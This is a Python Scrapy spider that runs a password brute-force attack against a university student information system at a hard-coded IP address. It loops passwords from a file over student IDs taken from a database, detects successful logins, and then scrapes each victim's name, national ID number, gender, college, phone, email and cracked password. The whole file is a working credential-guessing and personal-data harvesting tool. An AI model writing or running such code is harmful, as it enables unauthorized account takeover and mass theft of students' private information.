# -*- coding: utf-8 -*-
import os
from enum import Enum

import scrapy
from students.items import StudentItem
import pymysql


class StudentsInfoSpider(scrapy.Spider):
    name = "students_info"
    allowed_domains = ["60.219.165.24"]
    start_urls = ['http://60.219.165.24/']

    domain = 'http://60.219.165.24/'
    login_url = 'loginAction.do'
    user_detail_url = 'xjInfoAction.do?oper=xjxx'
    user_info_url = 'userInfo.jsp'
    LOGIN_STATUS = Enum('LOGIN_STATUS', 'SUCCESS WRONG_ID WRONG_PASS')

    def start_requests(self):
        for password in self.load_passwords():
            for sid in self.get_sids():
                yield scrapy.FormRequest(self.domain + self.login_url,
                                         formdata={'zjh': str(sid), 'mm': password},
                                         callback=self.parse,
                                         meta={'sid': sid, 'password': password, 'cookiejar': sid},
                                         dont_filter=True)

    def parse(self, response):
        login_status = self._check_login_status(response)
        self.logger.info('[{}] login status[{}] using password[{}]'.format(
            response.meta['sid'],
            login_status,
            response.meta['password']))
        if login_status == self.LOGIN_STATUS.WRONG_ID:
            return
        if login_status == self.LOGIN_STATUS.WRONG_PASS:
            student = StudentItem()
            student['sid'] = response.meta['sid']
            yield student
        else:
            yield scrapy.Request(self.domain + self.user_detail_url,
                                 callback=self._parse_user_detail,
                                 dont_filter=True,
                                 meta={'sid': response.meta['sid'],
                                       'password': response.meta['password'],
                                       'cookiejar': response.meta['cookiejar']})

    def _check_login_status(self, response):
        flag_tag = response.css('td[class="errorTop"] font::text').extract_first()
        if flag_tag is None:
            return self.LOGIN_STATUS.SUCCESS
        else:
            if flag_tag.find('证件号不存在') != -1:
                return self.LOGIN_STATUS.WRONG_ID
            else:
                return self.LOGIN_STATUS.WRONG_PASS

    def _parse_user_detail(self, response):
        def extract_with_css(query):
            return response.css(query).extract_first(default='null').strip()

        student = StudentItem()
        student["sid"] = extract_with_css('#tblView > tr:nth-child(1) > td:nth-child(2)::text')
        student["name"] = extract_with_css('#tblView > tr:nth-of-type(1) > td:nth-of-type(4)::text')
        gender = extract_with_css('#tblView > tr:nth-child(4) > td:nth-child(2)::text')
        student["gender"] = 1 if gender == '男' else 0
        student["id"] = extract_with_css('#tblView > tr:nth-child(3) > td:nth-child(4)::text')
        student["nationality"] = extract_with_css('#tblView > tr:nth-child(6) > td:nth-child(4)::text')
        student["college"] = extract_with_css('#tblView > tr:nth-child(13) > td:nth-child(4)::text')
        student["class_name"] = extract_with_css('#tblView > tr:nth-child(15) > td:nth-child(4)::text')
        student["password"] = response.meta["password"]

        request = scrapy.Request(self.domain + self.user_info_url,
                                 callback=self._parse_user_info,
                                 dont_filter=True,
                                 meta={'sid': response.meta['sid'], 'cookiejar': response.meta['cookiejar']})
        request.meta['student'] = student
        yield request

    def _parse_user_info(self, response):
        student = response.meta['student']
        text_input = response.css('input[type=text]::attr(value)').extract()
        student['tel'] = text_input[0]
        student['email'] = text_input[2]
        yield student

    def get_sids(self):
        sql = "SELECT sid FROM `students_all` " \
              "WHERE password IS NULL ORDER BY sid ASC LIMIT 1;"
        conn = pymysql.connect(**self.settings.get('MYSQL_DB_KWARGS'))
        try:
            with conn.cursor() as cursor:
                cursor.execute(sql)
                result = cursor.fetchone()
                while result:
                    yield result[0]
                    result = cursor.fetchone()
        finally:
            conn.close()

    def load_passwords(self):
        pass_file = os.path.join(self.settings.get('BASE_PATH'), "passwords.txt")
        with open(pass_file, 'r') as file:
            password = file.readline()
            while password:
                password = password.strip()
                if password:
                    yield password
                password = file.readline()
